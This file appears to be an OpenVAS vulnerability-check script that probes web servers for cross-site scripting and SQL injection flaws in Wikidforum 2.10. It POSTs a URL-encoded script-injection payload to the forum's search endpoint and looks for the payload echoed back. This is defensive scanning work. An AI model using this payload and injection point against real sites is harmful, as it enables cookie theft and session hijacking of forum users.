###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wikidforum_mult_xss_n_sql_inj_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Wikidforum Multiple XSS and SQL Injection Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to execute arbitrary web
  script or HTML in a user's browser session in the context of an affected
  site and manipulate SQL queries by injecting arbitrary SQL code.
  Impact Level: Application";
tag_affected = "Wikidforum version 2.10";
tag_insight = "The flaws are due to input validation errors in the 'search' field
  and 'Author', 'select_sort' and 'opt_search_select' parameters in
  'Advanced Search' field when processing user-supplied data.";
tag_solution = "No solution or patch is available as of 30th January, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.wikidforum.com/download.html";
tag_summary = "This host is running Wikidforum and is prone to multiple cross-site
  scripting and SQL injection vulnerabilities.";

if(description)
{
  script_id(802710);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-6520", "CVE-2012-2099");
  script_bugtraq_id(52425);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-03-16 13:30:44 +0530 (Fri, 16 Mar 2012)");
  script_name("Wikidforum Multiple XSS and SQL Injection Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/80838");
  script_xref(name : "URL" , value : "http://www.osvdb.org/80839");
  script_xref(name : "URL" , value : "http://seclists.org/oss-sec/2012/q2/75");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/73985");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/73980");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/521934");
  script_xref(name : "URL" , value : "http://www.darksecurity.de/advisories/2012/SSCHADV2012-005.txt");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/110697/SSCHADV2012-005.txt");
  script_xref(name : "URL" , value : "http://sec.jetlib.com/Bugtraq/2012/03/12/Wikidforum_2.10_Multiple_security_vulnerabilities");
  script_xref(name : "URL" , value : "http://www.wikidforum.com/forum/forum-software_29/wikidforum-support_31/sschadv2012-005-unfixed-xss-and-sql-injection-security-vulnerabilities_188.html");

  script_description(desc);
  script_summary("Check if Wikidforum is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port =0;
req = "";
res = "";
dir = "";
sndReq = "";
rcvRes = "";
postdata = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list("", "/wiki", "/wikidforum", cgi_dirs()))
{
  ## Send and Recieve the response
  sndReq = http_get(item:string(dir, "/admin/login.php"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

  if(rcvRes && ('"Wikid Forum' >< rcvRes || (">Wiki - Admin<" >< rcvRes &&
          "loginboxmain" >< rcvRes && "loginimgmain" >< rcvRes)))
  {
    ## Construct the POST data
    postdata = "txtsearch=%27%22%3C%2Fscript%3E%3Cscript%3Ealert%28" +
                "document.cookie%29%3C%2Fscript%3E";
    req = string("POST ", dir, "/index.php?action=search&mode=search HTTP/1.1\r\n",
                 "Host: ", get_host_name(), "\r\n",
                 "User-Agent:  WikidForum-XSS-Test\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);
    res = http_send_recv(port:port, data:req);

    if(res && "><script>alert(document.cookie)</script>" >< res)
    {
      security_hole(port);
      exit(0);
    }
  }
}
